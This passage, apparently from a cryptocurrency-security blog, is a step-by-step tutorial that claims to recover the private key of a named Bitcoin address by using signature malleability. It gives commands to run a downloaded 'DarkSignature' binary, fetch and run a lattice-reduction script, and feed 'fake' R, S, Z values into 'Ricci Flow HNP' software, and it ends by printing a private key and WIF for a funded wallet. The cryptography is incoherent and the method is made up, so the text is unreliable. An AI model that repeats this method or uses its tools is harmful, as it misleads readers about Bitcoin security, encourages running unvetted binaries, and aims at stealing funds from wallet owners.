<figure class="aligncenter size-full"><a href="https://www.youtube.com/watch?v=isWxfa3PeHU"><img loading="lazy" decoding="async" width="666" height="386" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1(1).png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-3035" srcset="https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-1.png 666w, https://cryptodeeptech.ru/wp-content/uploads/2024/11/image-1-300x174.png 300w" sizes="auto, (max-width: 666px) 100vw, 666px"></a></figure></div>


<p></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/darksignature" target="_blank" rel="noreferrer noopener"><strong>Example #1</strong></a>&nbsp;using the<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/darksignature" target="_blank" rel="noreferrer noopener"><strong>&nbsp;DarkSignature</strong></a></em>&nbsp;tool:</p>
</blockquote>



<p>Let’s go back to the root directory of the&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener"><strong>Broadcast Bitcoin Transaction repository</strong></a></p>



<p><strong>Command:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2187a86ab4b467bc62c2aa17e7f8cef3" style="color:#4092c2"><code><strong>cd -

ls
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-30-1024x294.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4826"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Command:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-f82b2299b813b390a63174e605dd5019" style="color:#4092c2"><code><strong>cd darksignature/

!chmod +x darksignature

ls

!./darksignature
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-31-1024x601.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4827"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-medium-font-size">To obtain&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/pubkey.txt" target="_blank" rel="noreferrer noopener">the public key</a>&nbsp;to the Bitcoin Address&nbsp;<strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw,</strong>&nbsp;select the command:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-d65deca57e050c01691efb3ae5965429" style="color:#4092c2"><code><strong>darksignature -address &lt;Bitcoin Address&gt;</strong></code></pre>



<p>Enter the Bitcoin address and get&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/pubkey.txt" target="_blank" rel="noreferrer noopener">the public key</a>&nbsp;:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2f75d832a49fcc1126bc2e65e68b2533" style="color:#4092c2"><code><strong>!./darksignature -address 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-32-1024x74.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4828"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Result:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e897902c49a53457167cee8c1ed405b1" style="color:#4092c2"><code><strong>pubkey: (HEX) = 049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em><strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener">Example #2</a></strong>&nbsp;using<strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener">&nbsp;Dockeyhunt Lattice Attack</a></strong></em>&nbsp;tool:</p>
</blockquote>



<p><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener"><strong>We launch the Dockeyhunt Lattice Attack</strong></a>&nbsp;software and&nbsp;<code>"Input date"</code>enter the Bitcoin Address&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw" target="_blank" rel="noreferrer noopener"><strong>1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</strong></a>&nbsp;in the field&nbsp;and receive the public key of the wallet:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-bdb963ea4f8cda42fbf27bf644131fa6" style="color:#4092c2"><code><strong>049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=53"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1024x544.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-190"></a><figcaption class="wp-element-caption"><em><a href="https://youtu.be/isWxfa3PeHU?t=53" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<p><strong>Let’s use the DarkSignature</strong>&nbsp;tool&nbsp;to get fake data&nbsp;<strong>R, S, Z</strong>&nbsp;values ​​for the ECDSA algorithm transaction. In the field,&nbsp;<code>"Input date"</code>enter the public key of the Bitcoin Address&nbsp;<strong><code>049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461</code></strong>and get the data&nbsp;<strong>R, S, Z</strong>&nbsp;values ​​in the amount of&nbsp;<em>32 Bitcoin transactions</em>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=67"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-1-1024x546.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-200"></a><figcaption class="wp-element-caption"><em><a href="https://youtu.be/isWxfa3PeHU?t=67" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Apply getting fake data value&nbsp;<strong>R, S, Z</strong>&nbsp;for ECDSA algorithm transaction in&nbsp;<a href="https://keyhunters.ru/google-colab-in-cryptanalysis/" target="_blank" rel="noreferrer noopener">Google Colab</a></p>



<p><strong>Let’s install the ECDSA module:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-8be306a934c87bfc04ea6164360c8f48" style="color:#4092c2"><code><strong>pip install ecdsa</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-33-1024x200.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4836"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To obtain coordinates&nbsp;<code><strong>(Gx, Gy)</strong></code>for the public key, we will use a&nbsp;<em>Python</em>&nbsp;script:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/darksignature/coordinates.py" target="_blank" rel="noreferrer noopener">darksignature/coordinates.py</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-34-1024x508.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4837"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-medium-font-size"><strong>Let’s use the command:</strong></p>



<p class="has-text-color has-link-color wp-elements-1a0e8b8da85f6d2dcb6a3f2f5ce555aa" style="color:#4092c2"><code><strong>darksignature -pubkey &lt;Gx Gy&gt;</strong></code></p>



<p><em>We run the Python</em>&nbsp;script code&nbsp;:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/darksignature/transactions.py" target="_blank" rel="noreferrer noopener">darksignature/transactions.py</a></strong>&nbsp;and get the data values&nbsp;<strong>​​R, S, Z</strong>&nbsp;in the amount will be&nbsp;<em>32 Bitcoin transactions</em>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/darkmedia.gif" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"></figure></div>


<p>After generation we get the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/SignatureRSZ.txt" target="_blank" rel="noreferrer noopener">SignatureRSZ.txt</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Also in the root directory:&nbsp;<code><strong>c:\PerelmanWork\Dockeyhunt Lattice Attack\</strong></code>we get the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Signatures.txt">Signatures.txt</a></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-2-1024x546.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-206"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=94"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-3-1024x542.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-207"></a><figcaption class="wp-element-caption"><em><a href="https://youtu.be/isWxfa3PeHU?t=94" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size">As we can see the first two digits the value of&nbsp;<strong><em>S</em></strong>&nbsp;is arranged as&nbsp;<strong>the Order of the group (N)</strong></p>
</blockquote>



<h3 class="wp-block-heading has-text-align-center"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_n.py" target="_blank" rel="noreferrer noopener">Python script: value_n.py</a></em></h3>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-17.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4739" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://perelmanwork.com/" target="_blank" rel="noreferrer noopener">As a tool for mathematical analysis and solving differential equations, we will use the Perelman Work</a></strong>&nbsp;software&nbsp;. We will select the option from the&nbsp;<strong>Functions and Graphs</strong>&nbsp;section for a complete relationship between variables through the integration of&nbsp;<strong>First-order differential equations:</strong>&nbsp;<code><strong>[ frac{dy}{dx} = g(y)h(x) quad Rightarrow quad frac{1}{g(y)} dy = h(x) dx ]</strong></code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-4-1024x548.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-210"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center">Ricci Flow Hidden Number Problem</h2>



<p>We copy the values ​​from the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/Signatures.txt">Signatures.txt</a></strong>&nbsp;according to the list and paste them into the input field&nbsp;<code><strong>Ricci Flow HNP</strong></code>to build completely new transactions of the&nbsp;<strong>ECDSA</strong>&nbsp;algorithm .</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=226"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-5-1024x542.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-211"></a><figcaption class="wp-element-caption"><em><a href="https://youtu.be/isWxfa3PeHU?t=226" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-11-1024x544.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-219"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-10-1024x543.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-218"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-9-1024x549.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-217"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-8-1024x545.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-216"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-6-1024x544.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-213"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>Using&nbsp;<a href="https://perelmanwork.com/" target="_blank" rel="noreferrer noopener"><strong>Perelman Work</strong></a>&nbsp;and&nbsp;<a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/"><strong>Dockeyhunt&nbsp;</strong></a><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener"><strong>Lattice Attack, we arbitrarily change variables to&nbsp;</strong></a><a href="https://cryptodeeptech.ru/signature-malleability/" target="_blank" rel="noreferrer noopener"><strong>Signature Malleability</strong></a>&nbsp;vulnerability&nbsp;as we wrote at the beginning&nbsp;<a href="https://cryptodeeptech.ru/signature-malleability/" target="_blank" rel="noreferrer noopener">of the article</a>&nbsp;this vulnerability in Bitcoin transaction occurs due to the fact that it is possible to change the value of&nbsp;&nbsp;<strong>S</strong>&nbsp;&nbsp;in the signature, while maintaining the validity of the signature. As we reported in the arbitrary formula all this is possible due to the fact that for the same signature it is possible to obtain several equivalent values&nbsp;&nbsp;<strong>​​(r,s′)</strong>&nbsp;:</em></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-37.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4852"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>As a final result of the transformation of variables in the signature value&nbsp;<strong>R, S′, Z</strong>&nbsp;we see two digits the value&nbsp;<strong><em>S</em>&nbsp;′</strong>&nbsp;is built as&nbsp;<strong>a field structure (P)</strong>&nbsp;:</p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-58fe20cb4fe6496c83155ba97d1de2b8" style="color:#4092c2"><code><strong>P = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f</strong></code></pre>



<p>This number defines the field in which the&nbsp;<strong>secp256k1</strong>&nbsp;curve operates to perform mathematical operations on points on&nbsp;<em>an elliptic curve</em>&nbsp;.</p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=1250"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-35-1024x546.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4845"></a><figcaption class="wp-element-caption"><em><a href="https://youtu.be/isWxfa3PeHU?t=1250" target="_blank" rel="noreferrer noopener">Time-stamped video</a></em></figcaption></figure></div>


<h3 class="wp-block-heading has-text-align-center"><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/value_p.py" target="_blank" rel="noreferrer noopener">Python script: value_p.py</a></em></h3>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-18.png" alt="Signature Malleability" class="wp-image-4740" style="width:838px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Now we know the signatures of the difference between the numbers&nbsp;<strong>N</strong>&nbsp;and&nbsp;<strong>P</strong>&nbsp;. When reducing, we can get a hidden number&nbsp;<strong>X</strong>&nbsp;as we know when shifting the generation of one-time numbers&nbsp;<strong>(NONCES)</strong>&nbsp;, the value of the signature variables&nbsp;<strong>R, S′, Z</strong>&nbsp;will tend to one point. This point will be a hidden number, that is,&nbsp;<em><strong>a private key</strong></em>&nbsp;.</p>



<p>(&nbsp;<strong>N</strong>&nbsp;&nbsp;are&nbsp;&nbsp;<em>point group structures</em>&nbsp;,&nbsp;&nbsp;<strong>P</strong>&nbsp;&nbsp;are&nbsp;&nbsp;<em>field structures</em>&nbsp;,&nbsp;<strong>X</strong>&nbsp;&nbsp;is&nbsp;&nbsp;<em>a private key</em>&nbsp;)</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>To obtain a private key, we will use&nbsp;<a href="https://keyhunters.ru/lattice-reduction-algorithms/" target="_blank" rel="noreferrer noopener">the lattice reduction algorithm&nbsp;<strong>(theorem of large numbers)</strong>&nbsp;.</a></em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-54.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4905" style="width:840px;height:auto"><figcaption class="wp-element-caption"><em><strong><a href="https://en.wikipedia.org/wiki/Lenstra%E2%80%93Lenstra%E2%80%93Lov%C3%A1sz_lattice_basis_reduction_algorithm" target="_blank" rel="noreferrer noopener">Reduction of a lattice basis in two-dimensional space: the lattice is represented by blue dots, the original basis by black vectors, the reduced basis by red vectors.</a></strong></em></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><a href="https://keyhunters.ru/lattice-reduction-algorithms/" target="_blank" rel="noreferrer noopener">Lenstra-Lenstra-Lovasz (LLL) Lattice Reduction Algorithm</a></h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Let’s use the LLL</strong>&nbsp;source code&nbsp;from&nbsp;<strong><a href="https://www.linkedin.com/in/darioclavijo" target="_blank" rel="noreferrer noopener">Darío Clavijo,</a></strong>&nbsp;a well-known developer on&nbsp;<strong>GitHub:&nbsp;</strong><strong><a href="https://github.com/daedalus" target="_blank" rel="noreferrer noopener">daedalus</a></strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://github.com/daedalus/BreakingECDSAwithLLL.git" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-38-1024x574.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4853"></a><figcaption class="wp-element-caption"><em><a href="https://github.com/daedalus/BreakingECDSAwithLLL.git" target="_blank" rel="noreferrer noopener"><strong>Repositories</strong></a></em></figcaption></figure></div>

<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-39.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4854" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://keyhunters.ru/google-colab-in-cryptanalysis/" target="_blank" rel="noreferrer noopener">Install SageMath in Google Colab:</a></strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e0d1a27361252b07a508f9f06f100564" style="color:#4092c2"><code><strong>!sudo apt-get install sagemath python3-ecdsa</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter is-resized"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-40.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4855" style="width:840px;height:auto"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Commands:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-156bbd87720e72b7bec9cb23a1266f8f" style="color:#4092c2"><code><strong>!wget https://raw.githubusercontent.com/demining/CryptoDeepTools/refs/heads/main/36SignatureMalleability/latticereductions.py
!wget https://raw.githubusercontent.com/demining/CryptoDeepTools/refs/heads/main/36SignatureMalleability/Ricci_Flow_Hidden_Number_Problem.txt
</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-41-1024x350.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4862"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Run&nbsp;<em>the Python</em>&nbsp;script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/latticereductions.py" target="_blank" rel="noreferrer noopener">latticereductions.py</a>&nbsp;and get&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">the private key</a>&nbsp;to the Bitcoin Address:&nbsp;<a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw" target="_blank" rel="noreferrer noopener">1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</a></strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-d2a4406a8b0d02c9290329023c9c2858" style="color:#4092c2"><code><strong>!cat Ricci_Flow_Hidden_Number_Problem.txt &gt; nonces.csv
!python latticereductions.py nonces.csv 243 32</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-42-1024x539.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4863"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong>Result:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-2c55aab53f6ac72c07e0ffc2effaf297" style="color:#4092c2"><code><strong>17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951</strong></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><strong>Install the Bitcoin</strong><em>&nbsp;library&nbsp;</em><a href="https://keyhunters.ru/exploring-bitcoin-tools-in-python-a-comprehensive-guide-to-the-bitcoin-package-on-pypi/"></a></p>
</blockquote>



<pre class="wp-block-code has-text-color has-link-color wp-elements-e1255bbe4e58a23675fd93194c0ab266" style="color:#4092c2"><code><strong>!pip install bitcoin</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-43-1024x286.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4866"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p><em>Let’s run&nbsp;&nbsp;</em><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/priv_addr.py" target="_blank" rel="noreferrer noopener"><strong>the code</strong></a><em>&nbsp;&nbsp;to check the Bitcoin Address match:</em></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-44.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4867"></figure></div>


<pre class="wp-block-code has-text-color has-link-color wp-elements-1430fb02e9d1fd98d397a583059ec387" style="color:#4092c2"><code><strong>__________________________________________________

Private Key WIF: 17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951
Bitcoin Address: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw
total_received 	= 21.25292140 Bitcoin
__________________________________________________
</strong></code></pre>



<p class="has-text-align-center has-text-color has-link-color wp-elements-9745838a4bc4a23a1bd341927263e00e" style="color:#19684b;font-size:25px"><strong>That’s right! The private key corresponds to the Bitcoin Wallet.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeeptech.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;&nbsp;and check:</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-7f3b35e89a9914cdd5555fc10db3bfa7" style="color:#4092c2"><code><strong>ADDR: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw
WIF:  5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur
HEX:  17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951</strong></code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-45.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4868"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center"><strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener">Dockeyhunt Lattice Attack</a></strong></h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Let’s consider obtaining a private key using the&nbsp;<strong><a href="https://dockeyhunt.com/dockeyhunt-lattice-attack/" target="_blank" rel="noreferrer noopener">Dockeyhunt Lattice Attack software as an example</a></strong></p>
</blockquote>



<p>To start&nbsp;<em><a href="https://keyhunters.ru/lattice-reduction-algorithms/" target="_blank" rel="noreferrer noopener">the lattice reduction algorithm,</a></em>&nbsp;click on the button: <strong><code>Private Key</code></strong></p>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=1279" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-47-1.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4914"></a><figcaption class="wp-element-caption"><a href="https://youtu.be/isWxfa3PeHU?t=1279" target="_blank" rel="noreferrer noopener"><strong>Time-stamped video</strong></a></figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>Next we need to make sure that we have received the required private key value in&nbsp;<strong>HEX format.</strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><a href="https://youtu.be/isWxfa3PeHU?t=1284" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures - CRYPTO DEEP TECH_files/image-49.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures" class="wp-image-4892"></a></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
